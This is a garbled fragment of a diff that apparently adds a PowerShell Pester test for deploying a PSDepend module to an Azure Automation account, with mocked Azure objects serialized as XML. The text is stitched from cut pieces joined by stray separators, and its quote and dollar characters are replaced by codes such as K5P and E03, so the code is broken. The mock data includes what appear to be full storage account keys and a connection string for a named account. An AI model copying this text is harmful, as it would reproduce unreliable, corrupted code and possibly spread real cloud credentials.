+            <Nil N=K5PContentLanguageK5P />
+            <Nil N=K5PCacheControlK5P />
+            <I64 N=K5PBlobSequenceNumberK5P>0</I64>
+            <S N=K5PAcceptRangesK5P>bytes</S>
+            <I32 N=K5PBlobCommittedBlockCountK5P>0</I32>
+            <','oymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+           ','5PNameK5P>Standard_LRS</S>
+            <S N=K5PTierK5P>Standard</S>
+     ','P>true</B>
+        <Nil N=K5PAzureFilesIdentityBasedAuthK5P />
+        <Nil N=K5PEnableHierarchicalNamespaceK5P />
+        <S N=K5PLargeFileSharesStateK5P>Disabled</S>
+        <Obj N=K5PNetworkRuleSetK5P RefId=K5P8K5P>
+            <TN RefId=K5P8K5P>
+            <T>Microsoft.Azure.Commands.Management.Storage.Models.PSNetworkRuleSet</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Commands.Management.Storage.Models.PSNetworkRuleSet</ToString>
+            <Props>
+            <Obj N=K5PIpRulesK5P RefId=K5P9K5P>
+                <TN RefId=K5P9K5P>
+                <T>Microsoft.Azure.Commands.Management.Storage.Models.PSIpRule[]</T>
+                <T>System.Array</T>
+                <T>System.Object</T>
+                </TN>
+                <LST />
+            </Obj>
+            <Obj N=K5PVirtualNetworkRulesK5P RefId=K5P10K5P>
+                <TN RefId=K5P10K5P>
+                <T>Microsoft.Azure.Commands.Management.Storage.Models.PSVirtualNetworkRule[]</T>
+                <T>System.Array</T>
+                <T>System.Object</T>
+                </TN>
+                <LST />
+            </Obj>
+            <S N=K5PBypassK5P>AzureServices</S>
+            <S N=K5PDefaultActionK5P>Allow</S>
+            </Props>
+        </Obj>
+        <Nil N=K5PGeoReplicationStatsK5P />
+        <Obj N=K5PContextK5P ','ToString>10/02/2017 16:05:15 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2017-10-02T16:05:15.39</DT>
+            <DT N=K5PUtcDateTimeK5P>2017-10-02T13:05:15.39Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2017-10-02T16:05:15.39+03:00</DT>
+            <DT N=K5PDateK5P>2017-10-02T00:00:00</DT>
+            <I32 N=K5PDayK5P>2</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>275</I32>
+            <I32 N=K5PHourK5P>16</I32>
+            <I32 N=K5PMillisecondK5P>390</I32>
+            <I32 N=K5PMinuteK5P>5</I32>
+            <I32 N=K5PMonthK5P>10</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>15</I32>
+            <I64 N=K5PTicksK5P>636425571153900000</I64>
+            <I64 N=K5PUtcTicksK5P>636425463153900000</I64>
+            <TS N=K5PTimeOfDayK5P>PT16H5M15.39S</TS>
+            <I32 N=K5PYearK5P>2017</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>03/22/2020 10:41:20 +02:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-03-22T10:41:20.57</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-03-22T08:41:20.57Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-03-22T10:41:20.57+02:00</DT>
+            <DT N=K5PDateK5P>2020-03-22T00:00:00</DT>
+            <I32 N=K5PDayK5P>22</I32>
+            <S N=K5PDayOfWeekK5P>Sunday</S>
+            <I32 N=K5PDayOfYearK5P>82</I32>
+            <I32 N=K5PHourK5P>10</I32>
+            <I32 N=K5PMillisecondK5P>570</I32>
+            <I32 N=K5PMinuteK5P>41</I32>
+            <I32 N=K5PMonthK5P>3</I32>
+            <TS N=K5POffsetK5P>PT2H</TS>
+            <I32 N=K5PSecondK5P>20</I32>
+            <I64 N=K5PTicksK5P>637204704805700000</I64>
+            <I64 N=K5PUtcTicksK5P>637204632805700000</I64>
+            <TS N=K5PTimeOfDayK5P>PT10H41M20.57S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PLastModifiedByK5P />
+        <Obj N=K5PTagsK5P RefId=K5P3K5P>
+            <TN RefId=K5P2K5P>
+            <T>System.Collections.Hashtable</T>
+            <T>System.Object</T>
+            </TN>
+            <DCT>
+            <En>
+                <S N=K5PKeyK5P>environment</S>
+                <S N=K5PValueK5P>Test</S>
+            </En>
+            </DCT>
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzAutomationModule {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.Module</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.Module</ToString>
+        <Props>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AANAme</S>
+        <S N=K5PNameK5P>PSDepend</S>
+        <B N=K5PIsGlobalK5P>false</B>
+        <S N=K5PVersionK5P>0.3.2</S>
+        <I64 N=K5PSizeInBytesK5P>71093</I64>
+        <I32 N=K5PActivityCountK5P>8</I32>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 17:42:32 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:42:32.617</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:42:32.617Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:42:32.617+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>617</I32>
+            <I32 N=K5PMinuteK5P>42</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>32</I32>
+            <I64 N=K5PTicksK5P>637242109526170000</I64>
+            <I64 N=K5PUtcTicksK5P>637242001526170000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H42M32.617S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>05/04/2020 17:44:14 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:44:14.537</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:44:14.537Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:44:14.537+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>537</I32>
+            <I32 N=K5PMinuteK5P>44</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>14</I32>
+            <I64 N=K5PTicksK5P>637242110545370000</I64>
+            <I64 N=K5PUtcTicksK5P>637242002545370000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H44M14.537S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <S N=K5PProvisioningStateK5P>Succeeded</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzAutomationModule {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.Module</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.Module</ToString>
+        <Props>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AAName</S>
+        <S N=K5PNameK5P>PSDepend</S>
+        <B N=K5PIsGlobalK5P>false</B>
+        <S N=K5PVersionK5P>0.3.2</S>
+        <I64 N=K5PSizeInBytesK5P>71093</I64>
+        <I32 N=K5PActivityCountK5P>8</I32>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 17:42:32 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:42:32.617</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:42:32.617Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:42:32.617+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYea','ationK5P>Infinite</S>
+            <S N=K5PPublicAccessK5P>BlobContainer</S>
+            <B N=K5PHasImmutabilityPolicyK5P>false</B>
+            <B N=K5PHasLegalHoldK5P>false</B>
+            <S N=K5PDefaultEncryptionScopeK5P>E03account-encryption-key</S>
+            <B N=K5PPreventEncryptionScopeOverrideK5P>false</B>
+            <S N=K5PETagK5P>K5P0x8D7F039D3D0C5C5K5P</S>
+            <Obj N=K5PMetadataK5P RefId=K5P9K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PContextK5P RefId=K5P10K5P>
+            <TN RefId=K5P9K5P>
+            <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>','K5PNameK5P>psdepend</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzStorageAccountKey {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Management.Storage.Models.StorageAccountKey</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Management.Storage.Models.StorageAccountKey</ToString>
+        <Props>
+        <S N=K5PKeyNameK5P>key1</S>
+        <S N=K5PValueK5P>aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+        <Obj N=K5PPermissionsK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.KeyPermission</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Full</ToString>
+            <I32>1</I32>
+        </Obj>
+        </Props>
+    </Obj>
+    <Obj RefId=K5P2K5P>
+        <TNRef RefId=K5P0K5P />
+        <ToString>Microsoft.Azure.Management.Storage.Models.StorageAccountKey</ToString>
+        <Props>
+        <S N=K5PKeyNameK5P>key2</S>
+        <S N=K5PValueK5P>lCvSampwF8ZkAgjaDJXpw3akynx5aEecS3Wg/WDeygQd7l+/bXMZD+uk0Dd0Jbk2tZ7nBO39W0fGXsZBQtK0zQ==</S>
+        <Obj N=K5PPermissionsK5P RefId=K5P3K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>Full</ToString>
+            <I32>1</I32>
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+      ','      <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            <S N=K5PBlobTypeK5P>Block</S>
+            <S N=K5PCopyCompletedOnK5P>01/01/0001 00:00:00 +00:00</S>
+            <Nil N=K5PCopyStatusDescriptionK5P />
+            <Nil N=K5PCopyIdK5P />
+            <Nil N=K5PCopyProgressK5P />
+            <Nil N=K5PCopySourceK5P />
+            <S N=K5PCopyStatusK5P>Pending</S>
+            <B N=K5PIsIncrementalCopyK5P>false</B>
+            <Nil N=K5PDestinationSnapshotK5P />
+            <S N=K5PLeaseDurationK5P>Infinite</S>
+            <S N=K5PLeaseStateK5P>Available</S>
+            <S N=K5PLeaseStatusK5P>Unlocked</S>
+            <I64 N=K5PContentLengthK5P>2274</I64>
+            <S N=K5PContentTypeK5P>application/octet-stream</S>
+            <S N=K5PETagK5P>K5P0x8D7F666B761B3E1K5P</S>
+            <BA N=K5PContentHashK5P>Oz7uCTeqWbwPHzSXuNcHFw==</BA>
+            <Nil N=K5PContentEncodingK5P />
+            <Nil N=K5PContentDispositionK5P />
+            <Nil N=K5PContentLanguageK5P />
+            <Nil N=K5PCacheControlK5P />
+            <I64 N=K5PBlobSequenceNumberK5P>0</I64>
+            <S N=K5PAcceptRangesK5P>bytes</S>
+            <I32 N=K5PBlobCommittedBlockCountK5P>0</I32>
+            <B N=K5PIsServerEncryptedK5P>true</B>
+            <Nil N=K5PEncryptionKeySha256K5P />
+            <Nil N=K5PEncryptionScopeK5P />
+            <S N=K5PAccessTierK5P>Hot</S>
+            <B N=K5PAccessTierInferredK5P>true</B>
+            <Nil N=K5PArchiveStatusK5P />
+            <S N=K5PAccessTierChangedOnK5P>01/01/0001 00:00:00 +00:00</S>
+            </Props>
+        </Obj>
+        <Nil N=K5PRemainingDaysBeforePermanentDeleteK5P />
+        <S N=K5PContentTypeK5P>application/octet-stream</S>
+        <Obj N=K5PLastModifiedK5P RefId=K5P7K5P>
+            <TN RefId=K5P6K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/12/2','    </Obj>
+        <Obj N=K5PAccessTierK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.AccessTier</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Hot</ToString>
+            <I32>0</I32>
+        </Obj>
+        <DT N=K5PCreationTimeK5P>2020-05-03T10:59:39.4378401Z</DT>
+        <Nil N=K5PCustomDomainK5P />
+        <Nil N=K5PIdentityK5P />
+        <Nil N=K5PLastGeoFailoverTimeK5P />
+        <Obj N=K5PPrimaryEndpointsK5P RefId=','
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P10K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P11K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+   ','
+            <I64 N=K5PTicksK5P>637242003450000000</I64>
+            <I64 N=K5PUtcTicksK5P>637242003450000000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H45M45S</TS>
+            <I32 N=K5PYea','5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P10K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.','5PLeaseStateK5P>Available</S>
+            <S N=K5PLeaseDurationK5P>Infinite</S','S>
+        <S N=K5PLocationK5P>westeurope</S>
+        <Obj N=K5PSkuK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Commands.Management.Storage.Models.PSSku</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Commands.Management.Storage.Models.PSSku</ToString>
+            <Props>
+            <S N=K5PNameK5P>Standard_LRS</S>
+            <S N=K5PTierK5P>Standard</S>
+            <Nil N=K5PResourceTypeK5P />
+            <Nil N=K5PKindK5P />
+            <Nil N=K5PLocationsK5P />
+            <Nil N=K5PCapabilitiesK5P />
+            <Nil N=K5PRestrictionsK5P />
+            </Props>
+        </Obj>
+        <S N=K5PKindK5P>StorageV2</S>
+        <Obj N=K5PEncryptionK5P RefId=K5P2K5P>
+            <TN RefId=K5P2K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.Encryption</','          Assert-MockCalled New-AzAutomationModule -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould should not use a Storage account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzStorageAccount -Exactly 0 -Scope It
+                    Assert-MockCalled Get-AzStorageContainer -Exactly 0 -Scope It
+                    Assert-MockCalled Get-AzStorageAccountKey -Exactly 0 -Scope It
+                    Assert-MockCalled New-AzStorageContainer -Exactly 0 -Scope It
+                    Assert-MockCalled New-AzStorageContext -Exactly 0 -Scope It
+                    Assert-MockCalled New-AzStorageBlobSASToken -Exactly 0 -Scope It
+                    Assert-MockCalled Set-AzStorageBlobContent -Exactly 0 -Scope It
+                }
+            }
+        }
+
+        Context 5hFScript Logic - Private Module5hF {
+
+            Mock Get-AzAutomationAccount {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.AutomationAccount</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.AutomationAccount</ToString>
+        <Props>
+        <S N=K5PSubscriptionIdK5P>c49124fa-befd-4207-a3b7-29c95c41a964</S>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AAName</S>
+        <S N=K5PLocationK5P>westeurope</S>
+        <S N=K5PStateK5P>Ok</S>
+        <S N=K5PPlanK5P>Basic</S>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <','>
+            <S N=K5PPublicAccessK5P>BlobContainer</S>
+            <B N=K5PHasImmutabilityPolicyK5P>false</B>
+            <B N=K5PHasLegalHoldK5P>false</B>
+            <S N=K5PDefaultEncryptionScopeK5P>E03account-encryption-key</S>
+            <B N=K5PPreventEncryptionScopeOverrideK5P>false</B>
+            <S N=K5PETagK5P>K5P0x8D7F039D3D0C5C5K5P</S>
+            <Obj N=K5PMetadataK5P RefId=K5P9K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PContextK5P RefId=K5P10K5P>
+            <TN RefId=K5P9K5P>
+            <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P10K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId','agement.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+
+            It 5hFshould get an Automation account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzAutomationAccount -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould query the Automation account for already imported module5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzAutomationModule -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould import the module into Automation account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled New-AzAutomationModule -E','       <Obj N=K5PICloudBlobK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlockBlob</T>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlob</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.CloudBlockBlob</ToString>
+            <Props>
+            <I32 N=K5PStreamWriteSizeInBytesK5P>4194304</I32>
+            <S N=K5PServiceClientK5P>Microsoft.Azure.Storage.Blob.CloudBlobClient</S>
+            <I32 N=K5PStreamMinimumReadSizeInBytesK5P>4194304</I32>
+            <S N=K5PPropertiesK5P>Microsoft.Azure.Storage.Blob.BlobProperties</S>
+            <Obj N=K5PMetadataK5P RefId=K5P2K5P>
+                <TN RefId=K5P2K5P>
+                <T>System.Collections.Generic.Di',' <Obj N=K5PExtendedPropertiesK5P RefId=K5P9K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=K5PNameK5P>PSDepend.zip</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+ ','e=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip</URI>
+            <S N=K5PStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip5hF; Secondary = 5hF5hF</S>
+            <Nil N=K5PSnapshotTimeK5P />
+            <B N=K5PIsSnapshotK5P>false</B>
+            <B N=K5PIsDeletedK5P>false</B>
+            <URI N=K5PSnapshotQualifiedUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip</URI>
+            <S N=K5PSnapshotQualifiedStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip5hF; Secondary = 5hF5hF</S>
+            <Nil N=K5PCopyStateK5P />
+            <S N=K5PNameK5P>PSDepend.zip</S>
+            <S N=K5PContainerK5P>Microsoft.Azure.Storage.Blob.CloudBlobContainer</S>
+            <S N=K5PParentK5P>Microsoft.Azure.Storage.Blob.CloudBlobDirectory</S>
+            <S N=K5PBlobTypeK5P>BlockBlob</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobTypeK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <','         E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</T>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBase</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</ToString>
+        <Props>
+        <Obj N=K5PCloudBlobContainerK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlobContainer</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.CloudBlobContainer</ToString>
+            <Props>
+            <S N=K5PServiceClientK5P>Microsoft.Azure.Storage.Blob.CloudBlobClient</S>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend5hF; Secondary = 5hF5hF</S>
+            <S N=K5PNameK5P>psdepend</S>
+            <Obj N=K5PMetadataK5P RefId=K5P2K5P>
+                <TN RefId=K5P2K5P>
